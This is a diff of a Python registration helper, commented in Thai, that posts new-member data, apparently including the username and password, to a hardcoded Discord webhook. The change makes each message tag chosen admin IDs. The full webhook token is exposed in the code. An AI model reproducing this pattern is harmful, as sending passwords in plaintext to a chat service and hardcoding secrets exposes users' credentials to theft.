@@ -56,17 +56,23 @@ def reset_global_status():
 import requests
 import json
 
-# ฟังก์ชันสำหรับส่งข้อมูลในรูปแบบ Embed ไปที่ Discord
+# ฟังก์ชันสำหรับส่งข้อมูลในรูปแบบ Embed ไปที่ Discord และแท็กแอดมิน
 def register_to_discord(username, password):
     # ใส่ URL ของ Webhook ที่คุณได้จาก Discord
     webhook_url = "https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz"
+
+    # กำหนด ID ของแอดมินที่ต้องการแท็ก
+    admin_ids = [486994554390577173, 123456789012]
     
+    # สร้างข้อความที่จะแท็กแอดมิน
+    mentions = " ".join([f"<@{admin_id}>" for admin_id in admin_ids])
+
     # สร้าง Embed message
     embed = {
         "embeds": [
             {
                 "title": "ข้อมูลการสมัครสมาชิกใหม่",
-                "description": f"ข้อมูลของผู้ใช้ใหม่\n\n",
+                "description": f"ข้อมูลของผู้ใช้ใหม่\n\n{mentions}",  # แท็กแอดมินที่กำหนด
                 "color": 5763719,  # สีของ Embed (ใช้รหัสสี Hex เช่น #00ff00 แปลงเป็น integer)
                 "fields": [
                     {
@@ -86,10 +92,10 @@ def register_to_discord(username, password):
             }
         ]
     }
-    
+
     # ส่งข้อมูล Embed ไปยัง Discord โดยใช้ POST request
     response = requests.post(webhook_url, data=json.dumps(embed), headers={"Content-Type": "application/json"})
-    
+
     # ตรวจสอบการตอบกลับจาก Discord
     if response.status_code == 204:
         print("✔️ ข้อมูล Embed ถูกส่งไปที่ Discord สำเร็จ")
